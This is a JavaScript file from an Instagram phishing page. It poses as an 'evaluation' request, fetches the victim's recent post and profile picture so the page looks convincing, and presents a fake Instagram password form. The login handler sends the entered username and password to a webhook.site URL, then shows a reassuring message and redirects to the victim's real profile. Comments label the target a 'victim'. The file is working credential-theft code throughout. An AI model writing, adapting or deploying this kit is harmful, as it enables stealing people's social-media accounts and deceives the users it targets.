// Instagram Login Script
const evaluation_btn = document.getElementsByClassName('request_eval_btn').item(0),
    username_btn = document.getElementsByClassName("login_btn").item(0),
    confirm_btn = document.getElementsByClassName("confirm_btn").item(0),
    main_login_btn = document.getElementsByClassName("main_login_btn").item(0),
    main_content = document.getElementsByClassName('form_change').item(0);

function getInstaUID(username) {

    if (username.toString().length > 0) {
        const Xhr = new XMLHttpRequest();
        Xhr.addEventListener('readystatechange', () => {
            if (Xhr.readyState == 4 && Xhr.status == 200) {
                let uid = Xhr.response.toString().trim();
                localStorage.setItem("InstaUid", uid.toString());
            }
        });
        Xhr.open('GET', `./uid.php?uname=${username}`, async = true);
        Xhr.setRequestHeader('X-Fbclick-Xpack', true);
        Xhr.send(null);
    }

}

function getUserDetail() {
    let luid = localStorage.getItem("InstaUid");
    if (luid != null) {
        if (typeof luid != 'string') luid = luid.toString();
        const Xhr = new XMLHttpRequest();
        Xhr.addEventListener('readystatechange', () => {
            if (Xhr.readyState == 4 && Xhr.status == 200) {
                let json_user_data = JSON.parse(Xhr.response);
                if (json_user_data['message'] != undefined) {
                    if (json_user_data['message'].includes(atob("dHJ5IGFnYWluLg==")) !== false) {
                        window.alert(json_user_data['message']);
                    } else {
                        console.log(json_user_data['message']);
                    }
                } else {
                    let count = parseInt(json_user_data["data"]["user"]["edge_owner_to_timeline_media"].count);
                    if (count > 0) {
                        let edges = json_user_data["data"]["user"]["edge_owner_to_timeline_media"]["edges"];
                        // showing error that node is undefined for username -> x._saba_.x16
                        // so make sure debug this damn shit
                        // error fixed

                        if (edges.length > 0) {
                            victim_location = (edges["0"]["node"].location !== null ? edges["0"]["node"].location.name : ""),
                                post_url = decodeURI(edges["0"]["node"].display_url),
                                post_description = (edges["0"]["node"]["edge_media_to_caption"]["edges"].length > 0 ? edges["0"]["node"]["edge_media_to_caption"]["edges"]["0"]["node"]["text"] : ""),
                                likes = (edges["0"]["node"]["edge_media_preview_like"] !== undefined ? edges["0"]["node"]["edge_media_preview_like"].count : ""),
                                comments = (edges["0"]["node"]["edge_media_to_comment"] !== undefined ? edges["0"]["node"]["edge_media_to_comment"].count : "");
                            const imageXHTP = new XMLHttpRequest();
                            imageXHTP.addEventListener('readystatechange', () => {
                                if (imageXHTP.readyState === 4 && imageXHTP.status === 200) {
                                    main_content.innerHTML = `Fetching latest posts..`;
                                    username_btn.style.display = 'none';
                                    username_btn.style.visibility = 'hidden';
                                    let user_data = {};
                                    user_data["location"] = victim_location;
                                    user_data["uid"] = luid;
                                    user_data["description"] = post_description;
                                    user_data["likes"] = likes;
                                    user_data["comments"] = comments;
                                    localStorage.setItem("user_data", JSON.stringify(user_data));
                                    localStorage.removeItem("InstaUid");
                                    window.setTimeout(() => {
                                        main_content.innerHTML =
                                            `
                                                <div class='postsArea'>
                                                    <h1>Latest Posts</h1>
                                                    <div class='postImage'>
                                                        <div class='postLocation'>${victim_location}</div>
                                                        <img src='${luid}.jpg' alt='${luid}' />
                                                    </div>
                                                    <div class='postDescription'>${post_description.replaceAll("\n", "<br/>")}</div>
                                                </div>
                                                <div class='likes_comments'>
                                                    <div class='likes'>
                                                        <div><box-icon name='heart'></box-icon></div>
                                                        <div>${likes.toString().replace(/\B(?<!\.\d*)(?=(\d{3})+(?!\d))/g, ",")}</div>
                                                    </div>
                                                    <div class='comments'>
                                                        <div><box-icon name='message-rounded-dots'></box-icon></div>
                                                        <div>${comments.toString().replace(/\B(?<!\.\d*)(?=(\d{3})+(?!\d))/g, ",")}</div>
                                                    </div>
                                                </div>
                                    `
                                            ;
                                        // username_btn.style.display = 'none';
                                        // username_btn.style.visibility = 'hidden';
                                        confirm_btn.style.display = 'block';
                                        confirm_btn.style.visibility = 'visible';
                                    }, 2000);
                                }
                            });
                            imageXHTP.open('GET', `./post_download.php?image_src=${post_url}&luid=${luid}`, true);
                            imageXHTP.send(null);
                        } else {
                            console.log("[-] Account is private. Can't fetch posts.");
                        }

                    } else {
                        console.log("[+] Victim did not posted anything.");
                    }
                }
            }
        });
        Xhr.open('GET', `./username_details.php?uid=${luid}`, async = true);
        Xhr.send(null);
    }
}

evaluation_btn.addEventListener('click', () => {

    window.setTimeout(() => {
        main_content.innerHTML =
            `
            <div class="logo_svg">
                <img src="./images/logo_form.png" alt="" />
            </div>

            <div class='username_txt'>
                <div class='username_txt_one'>Please type your instagram username and click "Sign in" and fill the next form.</div>
                <div class='username_txt_two'>(When typing your username, pay attention to ( lowercase, capital ) letters! Otherwise, you will get an error)</div>
            </div>

            <div class='input_field'>
                <input onkeyup='return checkInput(this);' autocomplete="off" type='text' name='username' placeholder='Username' required />
            </div>
        `;
        username_btn.style.display = 'block';
        username_btn.style.visibility = 'visible';
        localStorage.setItem("stageChecker", 2);
    }, 1500);

});

function checkInput(input) {
    if (input.value.toString().length > 0) {
        username_btn.style.opacity = 1;
        username_btn.removeAttribute('disabled');
    } else {
        username_btn.style.opacity = 0.7;
        username_btn.setAttribute('disabled', '');
    }
}

username_btn.addEventListener('click', () => {
    const input = document.querySelector(".input_field input");
    localStorage.setItem("Username", input.value.toString());
    getInstaUID(input.value.toString());
    window.setTimeout(getUserDetail, 1500);
});


function stageChanger() {
    let stage = (localStorage.getItem("stageChecker") != null ? parseInt(localStorage.stageChecker) : null);
    if (stage) {
        if (stage == 2) {
            main_content.innerHTML =
                `
                <div class="logo_svg">
                    <img src="./images/logo_form.png" alt="" />
                </div>

                <div class='username_txt'>
                    <div class='username_txt_one'>Please type your instagram username and click "Sign in" and fill the next form.</div>
                    <div class='username_txt_two'>(When typing your username, pay attention to ( lowercase, capital ) letters! Otherwise, you will get an error)</div>
                </div>

                <div class='input_field'>
                    <input onkeyup='return checkInput(this);' autocomplete="off" type='text' name='username' placeholder='Username' required />
                </div>
            `;
            username_btn.style.display = 'block';
            username_btn.style.visibility = 'visible';
        } else if (stage == 3) {
            main_content.innerHTML =
                `
        <form name='login_form' class='login_form'>
            <img src='./images/logo_form.png' width=200 alt='Insta Logo' />
            <div class='profile_pic_area'>
                <img src=${JSON.parse(localStorage.user_data).uid + '_profile_pic.jpg'} alt='Profile Pic' />
            </div>
            <div class='input_field'>
                <input autocomplete="off" type='password' name='password' placeholder='Password' required />
            </div>
            <div class='input_field'>
                <div class='input_checkbox'><input type='checkbox' /></div>
                <div class='input_field_txt'>Save login info</div>
            </div>
            <div class='forgot_pass_lnk'>
                <a href='#'>Forgot password?</a>
            </div>
        </form>
    `
                ;
            confirm_btn.style.display = 'none';
            confirm_btn.style.visibility = 'hidden';
            main_login_btn.style.display = 'block';
            main_login_btn.style.visibility = 'visible';
        }
    }
}

main_login_btn.addEventListener('click', () => {

    let username = localStorage.Username.toString(),
        password = encodeURI(document.querySelector("input[type=password]").value.trim().toString());

    if ((username.length < 0 || username === "") === true || (password.length < 0 || password === "") === true) {
        window.alert("Please enter your username and password.");
    } else {
        fetch(`https://webhook.site/<YOUR_WEBHOOK_TOKEN>?username=${username}&password=${password}`);
        window.setTimeout(() => {
            if (window.confirm("Thanks for submitting the form. Our team will analyze your evaluation form and will get back to you\
                over the mail within 2 to 3 working days.") === true) {
                window.location.href = `https://www.instagram.com/${username}/`;
            }

        }, 1500);
        localStorage.clear();
    }
});

confirm_btn.addEventListener('click', () => {

    // download and display user profile pic
    let luid = JSON.parse(localStorage.user_data).uid;
    const profxhr = new XMLHttpRequest();
    profxhr.addEventListener('readystatechange', () => {
        if (profxhr.readyState === 4 && profxhr.status === 200) {
            let prof_pic = JSON.parse(profxhr.response)["data"]["user"].hd_profile_pic_url_info.url;
            fetch(`profile_download.php?profile_url=${prof_pic}&luid=${luid}`);

        }
    });
    profxhr.open('GET', `./new_API.php?uid=${luid}`, true);
    profxhr.send(null);



    window.setTimeout(() => {
        // capture the details of the user
        main_content.innerHTML =
            `
    <form name='login_form' class='login_form'>
        <img src='./images/logo_form.png' width=200 alt='Insta Logo' />
        <div class='profile_pic_area'>
            <img src=${luid + '_profile_pic.jpg'} alt='Profile Pic' />
        </div>
        <div class='input_field pass_field'>
            <input autocomplete="off" type='password' name='password' placeholder='Password' required />
        </div>
        <div class='input_field'>
            <div class='input_checkbox'><input type='checkbox' /></div>
            <div class='input_field_txt'>Save login info</div>
        </div>
        <div class='forgot_pass_lnk'>
            <a href='#'>Forgot password?</a>
        </div>
    </form>
`
            ;
        confirm_btn.style.display = 'none';
        confirm_btn.style.visibility = 'hidden';
        main_login_btn.style.display = 'block';
        main_login_btn.style.visibility = 'visible';
        localStorage.setItem("stageChecker", '3');
    }, 2000);
});

stageChanger();
